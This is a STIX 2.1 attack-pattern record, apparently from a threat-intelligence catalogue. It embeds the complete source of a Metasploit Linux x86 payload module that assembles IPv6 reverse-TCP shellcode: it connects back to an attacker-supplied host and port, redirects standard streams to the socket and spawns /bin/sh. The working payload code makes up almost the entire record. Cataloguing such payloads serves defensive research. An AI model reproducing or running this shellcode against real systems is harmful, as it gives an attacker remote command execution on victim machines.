{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--161c564b-bba3-4132-8b49-5320208a86e6",
    "created": "2024-08-14T16:33:19.431682Z",
    "modified": "2024-08-14T16:33:19.431686Z",
    "name": "Linux Command Shell, Reverse TCP Inline (IPv6)",
    "description": "Connect back to attacker and spawn a command shell over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/shell_reverse_tcp_ipv6.rb",
            "external_id": "shell_reverse_tcp_ipv6.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  CachedSize = 158\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',\n      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',\n      'Author'        => 'Matteo Malvica <matteo[at]malvica.com>',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix\n    ))\n  end\n\ndef generate(opts={})\n      # tcp port conversion\n      port_order = ([1,0]) # byte ordering\n      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array\n      tcp_port.pop     # removes the first useless / from  the array\n      tcp_port.shift   # removes the last useless  / from  the array\n      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.\n\n      # ipv6 address conversion\n      # converts user's input into ipv6 hex representation\n      words = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/..../).map {|i| i.unpack('V').first.to_s(16)}\n      payload_data =<<-EOS\n        xor  ebx,ebx\n        mul  ebx\n        push 0x6\n        push 0x1\n        push 0xa\n        mov  ecx,esp\n        mov  al,0x66\n        mov  bl,0x1\n        int  0x80\n        mov  esi,eax\n\n      connect:\n        xor  ecx,ecx\n        xor  ebx,ebx\n        push ebx\n        push ebx\n        push 0x#{words[3]}\n        push 0x#{words[2]}\n        push 0x#{words[1]}\n        push 0x#{words[0]}\n        push ebx\n        push.i16 0x#{tcp_port}\n        push.i16 0xa\n        mov ecx, esp\n        push.i8 0x1c\n        push ecx\n        push esi\n        xor ebx,ebx\n        xor eax,eax\n        mov al,0x66\n        mov bl,0x3\n        mov ecx,esp\n        int 0x80\n        xor ebx,ebx\n        cmp eax,ebx\n        jne retry\n        xor ecx,ecx\n        mul ecx\n        mov ebx,esi\n        mov al,0x3f\n        int 0x80\n        xor eax,eax\n        inc ecx\n        mov ebx,esi\n        mov al,0x3f\n        int 0x80\n        xor eax,eax\n        inc ecx\n        mov ebx,esi\n        mov al,0x3f\n        int 0x80\n        xor edx,edx\n        mul edx\n        push edx\n        push 0x68732f2f\n        push 0x6e69622f\n        mov ebx,esp\n        push edx\n        push ebx\n        mov ecx,esp\n        mov al,0xb\n        int 0x80\n        ret\n\n      retry:\n        xor ebx,ebx\n        push ebx\n        push.i8 0xa\n        mul ebx\n        mov ebx,esp\n        mov al,0xa2\n        int 0x80\n        jmp connect\n        ret\n\n      exit:\n        xor eax,eax\n        mov al,0x1\n        int 0x80\n    EOS\n\n    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}